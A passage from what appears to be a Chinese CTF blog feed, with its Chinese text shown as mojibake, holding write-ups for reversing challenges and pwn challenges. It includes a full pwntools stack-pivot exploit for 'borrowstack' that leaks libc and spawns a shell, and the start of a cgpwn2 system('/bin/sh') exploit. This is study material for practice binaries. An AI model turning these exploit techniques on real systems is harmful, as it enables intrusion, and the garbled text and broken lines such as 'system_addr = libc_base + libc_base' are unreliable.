æ­¤ä¸å­˜åœ¨å†™å…¥æƒé™ä¸è¶³çš„æƒ…å†µã€‚å¦‚æœè¯»å†™æƒé™æ²¡ç»™ï¼Œæ‰‹åŠ¨è®¾å®šï¼Œç»™è¯»å†™æƒé™ã€‚</li><li>é‡‡ç”¨éæœ¬åœ°ç”¨æˆ·æ¨¡å¼ç™»å½•ï¼Œä¸é‡‡ç”¨æœ¬åœ°ç”¨æˆ·æ¨¡å¼çš„åŒºåˆ«æ˜¯ï¼šé‡‡ç”¨éæœ¬åœ°ç”¨æˆ·æ¨¡å¼<strong>å¯ä»¥æŒ‡å®šFTPæ–‡ä»¶å¤¹</strong>ã€‚<br>ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å®‰æ’æŠ—ç–«èµ›</title>
    <link href="/2020/02/29/%E5%AE%89%E6%81%92%E6%8A%97%E7%96%AB%E8%B5%9B/"/>
    <url>/2020/02/29/%E5%AE%89%E6%81%92%E6%8A%97%E7%96%AB%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="å®‰æ’æŠ—ç–«èµ›"><a href="#å®‰æ’æŠ—ç–«èµ›" class="headerlink" title="å®‰æ’æŠ—ç–«èµ›"></a>å®‰æ’æŠ—ç–«èµ›</h1><p>å¾ˆç®€å•çš„æ¯”èµ›ï¼Œé¢˜ä¹Ÿä¸å¤šï¼Œè®°å½•ä¸€ä¸‹åšçš„2é“ç®€å•çš„Reã€‚</p><h2 id="re1-pyc"><a href="#re1-pyc" class="headerlink" title="re1_pyc"></a>re1_pyc</h2><p>æ‹¿åˆ°çš„æ˜¯ä¸€ä¸ªpycæ–‡ä»¶ã€‚ç›´æ¥æ‹¿åˆ°ç½‘ç«™ä¸Šåç¼–è¯‘ä¸€ä¸‹ï¼š</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> string<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">caser</span><span class="hljs-params">(flag)</span>:</span>    enc1 = <span class="hljs-string">''</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:        enc1 += chr(ord(i) - <span class="hljs-number">5</span>)        <span class="hljs-keyword">return</span> enc1<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rail</span><span class="hljs-params">(flag)</span>:</span>    p1 = <span class="hljs-string">''</span>    p2 = <span class="hljs-string">''</span>    p3 = <span class="hljs-string">''</span>    enc2 = <span class="hljs-string">''</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(flag)):        j = i % <span class="hljs-number">3</span>        <span class="hljs-keyword">if</span> j == <span class="hljs-number">0</span>:            p1 += flag[i]            <span class="hljs-keyword">continue</span>        <span class="hljs-keyword">if</span> j == <span class="hljs-number">1</span>:            p2 += flag[i]            <span class="hljs-keyword">continue</span>        p3 += flag[i]        enc2 = p1 + p2 + p3    <span class="hljs-keyword">return</span> enc2<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rep</span><span class="hljs-params">(flag)</span>:</span>    table1 = <span class="hljs-string">'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'</span>    table2 = <span class="hljs-string">'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm'</span>    table = string.maketrans(table1, table2)    <span class="hljs-keyword">return</span> flag.translate(table, <span class="hljs-string">'='</span>)<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    flag = raw_input(<span class="hljs-string">'please input flag to check:'</span>)    <span class="hljs-keyword">if</span> rep(base64.b64encode(rail(caser(flag)))) == <span class="hljs-string">'ywjCytmRxI9CycWZngD2ncTDkZqYlJrGmhHCxISUnfWSlgfDlJi'</span>:        <span class="hljs-keyword">print</span> <span class="hljs-string">'Success!you got it!'</span>        <span class="hljs-keyword">break</span>        <span class="hljs-keyword">continue</span>    <span class="hljs-keyword">print</span> <span class="hljs-string">'try a gain'</span></code></pre></div><p>é€»è¾‘æŒºç®€å•çš„ï¼Œç›´æ¥æ‹¿ç€è¿™ä¸ªä»£ç æ”¹ä¸‹ï¼š</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> string<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">caser</span><span class="hljs-params">(flag)</span>:</span>    enc1 = <span class="hljs-string">''</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:        enc1 += chr(ord(i) + <span class="hljs-number">5</span>)        <span class="hljs-keyword">return</span> enc1<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rail</span><span class="hljs-params">(flag)</span>:</span>    p1 = <span class="hljs-string">''</span>    p2 = <span class="hljs-string">''</span>    p3 = <span class="hljs-string">''</span>    enc2 = <span class="hljs-string">''</span>    j = <span class="hljs-number">0</span>    x = <span class="hljs-number">25</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(x):        j = i + <span class="hljs-number">13</span>        z = j + <span class="hljs-number">13</span>        p3 += flag[i] + flag[j]         <span class="hljs-keyword">if</span> z &gt;= <span class="hljs-number">38</span> :            <span class="hljs-keyword">break</span>        p3 += flag[z]        enc2 = p1 + p2 + p3    <span class="hljs-keyword">return</span> enc2<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rep</span><span class="hljs-params">(flag)</span>:</span>    table1 = <span class="hljs-string">'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'</span>    table2 = <span class="hljs-string">'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm'</span>    table = string.maketrans(table1, table2)    <span class="hljs-keyword">return</span> flag.translate(table, <span class="hljs-string">'='</span>)key = <span class="hljs-string">'ywjCytmRxI9CycWZngD2ncTDkZqYlJrGmhHCxISUnfWSlgfDlJi'</span>flag = rail(caser(base64.b64decode(rep(key) + <span class="hljs-string">'='</span>)))print(flag)</code></pre></div><h2 id="maze1"><a href="#maze1" class="headerlink" title="maze1"></a>maze1</h2><p>ä¸€ä¸ªç®€å•çš„mazeé—®é¢˜ï¼Œä¸è¿‡æ˜¯c++å†™çš„ï¼Œidaåç¼–è¯‘çœ‹èµ·æ¥æœ‰ç‚¹éš¾è¯»ã€‚</p><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/03LBOC.png" srcset="/img/loading.gif" alt><br>ä»è¿™é‡Œç¡®å®šä¸‹åœ°å›¾ï¼Œåé¢çš„2å°±æ˜¯ç»ˆç‚¹ã€‚å»å†…å­˜ä¸­å–å‡ºæ¥åœ°å›¾ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/x7t4PS.png" srcset="/img/loading.gif" alt><br>å»idaç»§ç»­åˆ†æï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/S2wojN.png" srcset="/img/loading.gif" alt><br>å‘ç°ä½ è¾“å…¥çš„å­—ç¬¦ä¸²éœ€è¦ç­‰äº10ï¼Œå¦‚æœä¸æ˜¯ç›´æ¥å°±å¤±è´¥ï¼Œé•¿åº¦ç­‰äº10æ‰ç»§ç»­åˆ¤æ–­ã€‚awsdè¿˜æ˜¯è¿™å‡ ä¸ªå­—ç¬¦æ§åˆ¶æ–¹å‘ã€‚å†è”ç³»ä¸€ä¸‹å‰é¢çš„åœ°å›¾ï¼Œç»ˆç‚¹æ˜¯2ï¼Œåªèƒ½èµ°10æ­¥ï¼ŒçŒœä¸€æ³¢dddddsssssã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/3qNEI0.png" srcset="/img/loading.gif" alt><br>å°±æ˜¯è¿™ä¸ªï¼Œflagå°±æ˜¯å»md5åŠ å¯†ä¸€ä¸‹å‡ºæ¥çš„å­—ç¬¦ä¸²ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è®°å½•iæ˜¥ç§‹æ–°æ˜¥å…¬ç›Šèµ›çš„ä¸¤ä¸ªé¢˜</title>
    <link href="/2020/02/25/%E8%AE%B0%E5%BD%95i%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E5%85%AC%E7%9B%8A%E8%B5%9B%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%A2%98/"/>
    <url>/2020/02/25/%E8%AE%B0%E5%BD%95i%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E5%85%AC%E7%9B%8A%E8%B5%9B%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="è®°å½•iæ˜¥ç§‹æ–°æ˜¥å…¬ç›Šèµ›çš„ä¸¤ä¸ªé¢˜"><a href="#è®°å½•iæ˜¥ç§‹æ–°æ˜¥å…¬ç›Šèµ›çš„ä¸¤ä¸ªé¢˜" class="headerlink" title="è®°å½•iæ˜¥ç§‹æ–°æ˜¥å…¬ç›Šèµ›çš„ä¸¤ä¸ªé¢˜"></a>è®°å½•iæ˜¥ç§‹æ–°æ˜¥å…¬ç›Šèµ›çš„ä¸¤ä¸ªé¢˜</h1><h2 id="åƒé¸¡ç¥å™¨"><a href="#åƒé¸¡ç¥å™¨" class="headerlink" title="åƒé¸¡ç¥å™¨"></a>åƒé¸¡ç¥å™¨</h2><p>è¿™ä¸ªé¢˜ç›®æ˜¯æ¯”èµ›æ—¶æ²¡åšï¼Œå› ä¸ºæœ‰ä¸€æ®µæ—¶é—´æ²¡åšreé¢˜ç›®äº†ï¼Œä¸‹æ¥çœ‹åˆ°è¿™ä¸ªé¢˜åšå‡ºçš„äººä¸ç®—å°‘ï¼Œå°±å»å°è¯•åšä¸€åšã€‚<br>æºç¨‹åºæ˜¯qtå†™çš„ï¼Œä»¥å‰å¬å®¤å‹è¯´è¿‡qtçš„ç¨‹åºidaæ˜¯é™æ€åˆ†æä¸äº†çš„ï¼Œå‡½æ•°è°ƒç”¨å¤ªå¤šäº†ï¼Œå°±ç›´æ¥åŠ¨æ€åˆ†æã€‚è¿™ä¸ªé¢˜ç›®åº”è¯¥æ˜¯æœ‰å¤šçº¿ç¨‹odæ‰“å¼€ç›´æ¥æ˜¯é»‘å±çš„ï¼Œå·¦ä¸‹è§’æ˜¾ç¤ºæ–°å»ºäº†ä¸€ä¸ªçº¿ç¨‹ï¼Œç¬¬ä¸€æ¬¡åšè¿™ç§é¢˜ä¹Ÿæ¯”è¾ƒæ²¡æœ‰å¤´ç»ªã€‚æŠ˜è…¾äº†ä¸€ä¼šå‘ç°ç”¨çš„<strong>x64dbg</strong>å¯ä»¥è°ƒè¯•äº†ã€‚</p><h3 id="x64dbgè°ƒè¯•"><a href="#x64dbgè°ƒè¯•" class="headerlink" title="x64dbgè°ƒè¯•"></a>x64dbgè°ƒè¯•</h3><p>ä¸€ç›´è¿è¡Œç¨‹åºç­‰ä»£ç è·‘åˆ°0x40å¼€å¤´çš„æ®µï¼Œè¿›å…¥login çš„æ¨¡å—ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/aQ0jsg.png" srcset="/img/loading.gif" alt><br>æ‰¾ä¸‹å­—ç¬¦ä¸²ï¼š<br>ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/AL01Oy.png" srcset="/img/loading.gif" alt><br>åœ¨è¿™é‡Œä¸‹ä¸ªæ–­ç‚¹ã€‚å› ä¸ºç™»é™†å¤±è´¥ä¼šè·³è½¬è¾“å‡ºè¿™ä¸ªå­—ç¬¦ä¸²çš„å‡½æ•°ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æŸ¥çœ‹å‡ºæ˜¯ä»å“ªé‡Œè·³è½¬è¿‡æ¥çš„ç„¶ååœ¨å¯†ç åˆ¤æ–­é‚£é‡Œæ¥ç»§ç»­åˆ†æã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/Ior8oA.png" srcset="/img/loading.gif" alt><br>çœ‹åˆ°å·²ç»è·³è½¬è¿‡æ¥äº†ï¼Œä½†æ˜¯å‘ç°é™„è¿‘æ²¡æœ‰ä»€ä¹ˆåˆ¤æ–­çš„åœ°æ–¹ï¼Œå»æ ¹æ®é‚£ä¸ªä»å“ªé‡Œè·³è½¬è¿‡æ¥ï¼Œè¿½è¿‡å»çœ‹åˆ°ç™»é™†æˆåŠŸè°ƒç”¨welcomeçš„å‡½æ•°ï¼Œä½†æ˜¯ä¹Ÿæ²¡æœ‰å‘ç°ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„é‚£é‡Œçš„åˆ¤æ–­ä¸æ˜¯è¦æ‰¾çš„å¯†ç åˆ¤æ–­ã€‚<br>æ¢ä¸ªæ€è·¯ï¼Œè¿˜æ˜¯è·³è½¬åˆ°å¤±è´¥é‚£é‡Œï¼Œä½†æ˜¯åœ¨<strong>ä¸Šå±‚å‡½æ•°</strong>çš„æ ˆä¸­ï¼Œå› ä¸ºå­˜åœ¨åˆ¤æ–­ç™»é™†çš„ç”¨æˆ·è·Ÿå¯†ç ï¼Œåº”è¯¥ä¼šå­˜åœ¨æˆ‘ä»¬è¾“å…¥çš„ä¸œè¥¿ï¼Œå¯»æ‰¾ä¸€ä¸‹å¯†ç è·Ÿç”¨æˆ·åã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/ExvIk2.png" srcset="/img/loading.gif" alt><br>æ‰¾åˆ°äº†ï¼Œç»™ç”¨æˆ·åå¯¹åº”çš„åœ°å€ä¸‹ä¸€ä¸ªç¡¬ä»¶æ–­ç‚¹ï¼Œæ¥çœ‹çœ‹å“ªé‡Œä¼šè®¿é—®è¿™é‡Œï¼Œåªè¦è®¿é—®äº†åŸºæœ¬è·ç¦»è¦æ‰¾çš„å‡½æ•°å·®ä¸è¿œäº†ã€‚å…¶ä¸­ç¬¬äºŒä¸ªå­—ç¬¦å¯¹åº”å¤„ï¼Œç»æµ‹è¯•ä¸åº”è¯¥ä¸‹æ–­ç‚¹ã€‚ä¸€ç›´è®©å…¶F9è¿è¡Œï¼Œç­‰åˆ°äº†ç”¨æˆ·0x40æ®µä»£ç ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/guzN1A.png" srcset="/img/loading.gif" alt><br>å‘ç°è¿™æ®µæ˜¯åœ¨ä¸€ä¸ªä¸ªå­—ç¬¦å¤„ç†<strong>lubenwei</strong>å­—ç¬¦ä¸²ï¼Œè¿˜æœ‰<code>ret</code>ï¼Œè¿™æ ·åŸºæœ¬å°±æ˜¯äº†ã€‚retä»¥ååˆ°ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/nTZ8tn.png" srcset="/img/loading.gif" alt><br>æ³¨æ„æ­¤å¤„çš„æ±‡ç¼–è¯­å¥ï¼Œå¹¶çœ‹ä¸‹å¯„å­˜å™¨æƒ…å†µï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/bua46M.png" srcset="/img/loading.gif" alt><br>åˆšåˆšèµ°è¿‡callå‡½æ•°ï¼Œä¸‹é¢ä¸”æœ‰cmpå¯¹æ¯”è¯­å¥ï¼Œå¹¶ä¸”å‘ç°äº†è¾“å…¥çš„å¯†ç <code>12345678</code>ï¼Œååˆ†å¯ç–‘äº†ã€‚<br>åœ¨è¿™å‡ å¤„å‡½æ•°ä¸‹æ–­ç‚¹ï¼Œé‡æ–°ç‚¹å‡»loginéªŒè¯è¿›è¡Œåˆ†æï¼Œå‘ç°çš„ç¡®æ–­åœ¨äº†ä¸‹çš„è¿™å‡ ä¸ªå‡½æ•°ï¼Œç»“åˆå¯„å­˜å™¨æŸ¥çœ‹å‘ç°ï¼Œè¾“å…¥çš„å¯†ç è·Ÿèµ°è¿‡<code>0x004021D3</code>è¿™ä¸ªå‡½æ•°åä¼ è¿‡æ¥çš„eaxè¿›è¡Œå¯¹æ¯”ã€‚å¹¶ä¸”ä¸€å¯¹æ¯”ä»¥åå°±è¿›å…¥äº†ï¼Œæç¤ºç™»é™†å¤±è´¥çš„åœ°æ–¹ã€‚æ‰€ä»¥è¿™ä¸ªeaxå°±æ˜¯ç”¨æˆ·çš„å¯†ç äº†ã€‚<br>æµ‹è¯•ä»¥åå‘ç°æ˜¯å°å†™çš„<code>eax  41D26F00</code> ï¼š41d26f00,è¾“å…¥å¯†ç ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/psY0ix.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/r3WZrp.png" srcset="/img/loading.gif" alt><br>Ok,æˆåŠŸäº†ã€‚</p><h2 id="borrowstack"><a href="#borrowstack" class="headerlink" title="borrowstack"></a>borrowstack</h2><p>è¿™ä¸ªé¢˜ç›®åå­—å°±æ˜¯borrowshack æ¥æ ˆã€‚å«ä¹‰å°±æ˜¯è½¬ç§»æ ˆï¼Œæ­£å¥½æœ€è¿‘åˆšå­¦è¿‡ï¼Œå°±åŠ¨æ‰‹å»åšäº†ï¼Œç»“æœå¡äº†å¾ˆä¹…ï¼Œä½†ä¹Ÿå­¦åˆ°å¾ˆå¤šï¼Œæ­¤å‰ç»ƒä¹ çš„æ ˆè¿ç§»é¢˜ç›®æ²¡æœ‰è¿™é¢˜çš„æƒ…å†µã€‚</p><h3 id="æŸ¥ä¿æŠ¤å’Œarch"><a href="#æŸ¥ä¿æŠ¤å’Œarch" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h3><div class="hljs"><pre><code class="hljs objc">[*] '/media/psf/mypwn2/xcgys/borrowstack'    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre></div><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span>&#123;  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-60h]</span>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0L</span>L);  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0L</span>L);  <span class="hljs-built_in">puts</span>(&amp;s);  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x70</span>uLL);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done!You can check and use your borrow stack now!"</span>);  read(<span class="hljs-number">0</span>, &amp;bank, <span class="hljs-number">0x100</span>uLL);  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>ä»£ç æ˜¯å¾ˆç®€å•çš„ï¼Œbankçš„åœ°å€åœ¨bssæ®µï¼Œä»¥åç•™ç€åšæ ˆè¿ç§»å°±å¯ä»¥äº† ã€‚æº¢å‡ºåœ°å€è¿˜æ˜¯åªå¯ä»¥æ§åˆ¶ebpï¼Œè·Ÿretadressã€‚æ¥ä¸‹æ¥å°±æ˜¯è‡ªå·±å­¦åˆ°çš„äº†ï¼Œè‡ªå·±æ‰‹åŠ¨è°ƒè¯•äº†ä¸€æ®µæ—¶é—´æ‰å‘ç°çš„ã€‚</p><h4 id="å‘ç‚¹ï¼ˆå­¦åˆ°çš„æ–°ä¸œè¥¿ï¼‰"><a href="#å‘ç‚¹ï¼ˆå­¦åˆ°çš„æ–°ä¸œè¥¿ï¼‰" class="headerlink" title="å‘ç‚¹ï¼ˆå­¦åˆ°çš„æ–°ä¸œè¥¿ï¼‰"></a>å‘ç‚¹ï¼ˆå­¦åˆ°çš„æ–°ä¸œè¥¿ï¼‰</h4><p>å…ˆè¯´ä¸‹è¿™ä¸ªç¨‹åºçš„æƒ…å†µï¼š<br>bank çš„åœ°å€ <code>.bss:0000000000601080</code><br><img src="http://qiqianyun.chumen77.xyz/uPic/Q3hjpz.png" srcset="/img/loading.gif" alt><br>æ³¨æ„çœ‹ä¸‹bssæ®µé‡Œgotæ®µçš„è·ç¦»ï¼Œä¸€å…±æ˜¯40ä¸ªå­—èŠ‚ï¼Œæ˜¯æ¯”è¾ƒè¿‘çš„ã€‚å¦‚æœæŒ‰æˆ‘ä»¥å‰çš„åšæ³•ç›´æ¥è¿ç§»åˆ°bankè¿™åœ°å€åšæ–°æ ˆï¼Œå½“æ ˆè¿ç§»è¿‡å»ä»¥åï¼Œä½¿ç”¨putså‡½æ•°æ¥æ³„éœ²æŸä¸ªå‡½æ•°gotå¯¹åº”çš„åœ°å€æ—¶ï¼Œä¼šå‘ç°å½“è°ƒç”¨putsä»¥åï¼Œä¼šè¿›å…¥libcä¸­å¼€å§‹ä¸€è¿ä¸²çš„å‡½æ•°è°ƒç”¨ï¼šç¬¬ä¸€ä¸ª<br><img src="http://qiqianyun.chumen77.xyz/uPic/2Zk09z.png" srcset="/img/loading.gif" alt><br>å‘ç°è¿˜æ²¡æœ‰pushï¼Œæ­¤æ—¶rspå°±æ˜¯bankçš„åœ°å€äº†ï¼Œpushè¿‡åè‚¯å®šæ ˆæŒ‡é’ˆå¼€å§‹æ…¢æ…¢å˜å°ï¼Œå¾€bssæ®µä¸Šæ–¹å»¶ä¼¸ã€‚<br>å½“è°ƒç”¨ç¬¬äºŒä¸ªå‡½æ•°ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/v02DA7.png" srcset="/img/loading.gif" alt><br>å‘ç°å·²ç»åˆ°äº†bssä¸Šæ–¹çš„gotè¡¨æ®µï¼Œè¿™æ ·æ¯«æ— ç–‘é—®ï¼Œé‡Œé¢çš„å€¼å°±ä¼šæ”¹åŠ¨äº†ï¼Œç¨‹åºæ¥ä¸‹æ¥å‘ç”Ÿä»€ä¹ˆæ˜¯å¾ˆéš¾é¢„æµ‹çš„ï¼Œå¹¶ä¸”ä¸ªäººä¹Ÿæ‹¿ä¸åˆ°åŸæœ¬çš„gotåœ°å€ï¼Œä»è€Œç®—å‡ºlibcåŸºåœ°å€ã€‚å¹¶ä¸”ä¼šå‘ç°ï¼Œå½“ä»¥å¾€å›åˆ°startå¤„æ¸…ç†æ ˆæƒ³å†æ¬¡åˆ©ç”¨æ¼æ´çš„æ—¶å€™ï¼Œä¹Ÿæ˜¯ä¸è¡Œäº†ï¼Œä¹Ÿæ˜¯å› ä¸ºä¸çŸ¥é“ä»€ä¹ˆæ•°æ®è¢«æ”¹åŠ¨ï¼Œé€ æˆäº†å½±å“ã€‚</p><h4 id="è§£å†³åŠæ³•"><a href="#è§£å†³åŠæ³•" class="headerlink" title="è§£å†³åŠæ³•"></a>è§£å†³åŠæ³•</h4><p>å°±æ˜¯æŠŠæ ˆè¿ç§»åˆ°bssæ®µçš„å°½é‡é åï¼Œè¿™æ ·å°±ä¼šå°½é‡ä¸å½±å“åˆ°gotè¡¨å’ŒåŸæœ¬æ­£å¸¸çš„æ•°æ®ã€‚è¿”å›åœ°å€ä¸å†æ˜¯è‡ªå·±å¸¸å¸¸ç”¨çš„startå¤„ï¼Œæ¢æˆå…¶ä»–åˆé€‚çš„åœ°æ–¹ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timecontext.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'amd64'</span>io = process(<span class="hljs-string">'./borrowstack'</span>)<span class="hljs-comment"># io = remote('123.56.85.29',3635)</span>elf = ELF(<span class="hljs-string">'./borrowstack'</span>)<span class="hljs-comment"># libc = elf.libc</span>leave_addr = <span class="hljs-number">0x0400699</span>offset = <span class="hljs-number">200</span>buf_addr = <span class="hljs-number">0x000601080</span>padding = <span class="hljs-number">0x60</span>start_addr = <span class="hljs-number">0x0400626</span>p = <span class="hljs-string">'\x00'</span>* padding + p64(buf_addr+offset) + p64(leave_addr)pop_rsi_rx_ret = <span class="hljs-number">0x400701</span> io.recvuntil(<span class="hljs-string">'want\n'</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)io.send(p)io.recvuntil(<span class="hljs-string">'stack now!\n'</span>)libc_start_main =  elf.got[<span class="hljs-string">'__libc_start_main'</span>]puts_plt = elf.symbols[<span class="hljs-string">'puts'</span>]puts_got = elf.got[<span class="hljs-string">'puts'</span>]pop_rdi_ret = <span class="hljs-number">0x400703</span>read_got = elf.got[<span class="hljs-string">'read'</span>]p = flat([<span class="hljs-string">'b'</span>*offset,(buf_addr+offset),pop_rdi_ret,puts_got,puts_plt,start_addr])raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(p)puts_add = u64((io.recv(<span class="hljs-number">6</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))print(hex(puts_add))obj = LibcSearcher(<span class="hljs-string">'puts'</span>,puts_add)libc_base = puts_add - obj.dump(<span class="hljs-string">'puts'</span>)print(hex(libc_base))sleep(<span class="hljs-number">0.1</span>)rec = libc_base + <span class="hljs-number">0x4526a</span>system_addr = libc_base + libc_basebinsh_addr = libc_base + libc_baseprint(hex(system_addr))print(hex(binsh_addr))io.recvline()io.recvuntil(<span class="hljs-string">'want\n'</span>)p = <span class="hljs-string">'\x00'</span>* padding + p64(<span class="hljs-number">1</span>) + p64(rec)io.send(p)io.interactive()</code></pre></div><h3 id="ç»“è®ºå’Œæ”¶è·"><a href="#ç»“è®ºå’Œæ”¶è·" class="headerlink" title="ç»“è®ºå’Œæ”¶è·"></a>ç»“è®ºå’Œæ”¶è·</h3><p>ç»“è®ºï¼šå½“æ ˆè¿ç§»åˆ°bssæ®µä»¥åï¼Œç”±äºlibcå‡½æ•°çš„è°ƒç”¨ï¼Œæ­¤æ—¶æ ˆæ…¢æ…¢å¢é«˜ï¼Œbssæ®µä»¥ä¸Šçš„æ•°æ®ä¹Ÿå¯èƒ½ä¼šè¢«æ”¹åŠ¨ã€‚<br>æ”¶è·ï¼šå½“å†é‡åˆ°æ ˆè¿ç§»é—®é¢˜çš„æ—¶å€™ï¼Œè¦æ³¨æ„bssæ®µä¸gotçš„è·ç¦»ï¼Œè¿”å›åœ°å€å†™å…¥startåœ°å€ï¼Œå‘ç°å‡ºç°é—®é¢˜çš„æ—¶å€™ï¼Œå°±è¯¥æå‡æ ˆè¿ç§»çš„åœ°å€é«˜åº¦ï¼Œå’Œæ‰¾ä¸ªåˆé€‚çš„è¿”å›ä½ç½®ï¼Œå†æ¬¡åˆ©ç”¨æ¼æ´ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XCTF\_pwnæ–°æ‰‹</title>
    <link href="/2020/02/17/XCTF_pwn%E6%96%B0%E6%89%8B/"/>
    <url>/2020/02/17/XCTF_pwn%E6%96%B0%E6%89%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="XCTF-pwnæ–°æ‰‹"><a href="#XCTF-pwnæ–°æ‰‹" class="headerlink" title="XCTF_pwnæ–°æ‰‹"></a>XCTF_pwnæ–°æ‰‹</h1><h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><h3 id="æŸ¥ä¿æŠ¤å’Œarch"><a href="#æŸ¥ä¿æŠ¤å’Œarch" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h3><div class="hljs"><pre><code class="hljs objc">Arch:     i386<span class="hljs-number">-32</span>-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (<span class="hljs-number">0x8048000</span>)</code></pre></div><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="/2020/02/17/XCTF_pwnæ–°æ‰‹/images/15819436335898.jpg" srcset="/img/loading.gif" alt="-w605"><br>æ¼æ´å°±åœ¨è¿™så¤„ï¼Œgetså¯ä»¥æ— é™è¯»å–ï¼Œå¯¼è‡´æ ˆæº¢å‡ºã€‚</p><h4 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h4><ol><li>ç¬¬ä¸€ä¸ªfgetsè·å–æ—¶å€™ï¼Œè¯»å–ä¸€ä¸ª<code>/bin/sh\x00</code>è¿›å»ï¼Œå› ä¸ºnameçš„åœ°å€æ˜¯å›ºå®šçš„ã€‚</li><li>getå‡½æ•°è·å–æ—¶å€™ï¼Œpadding + system_plt +nameåœ°å€å³å¯ã€‚</li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span><span class="hljs-comment"># io = process('./cgpwn2')</span>io = remote(<span 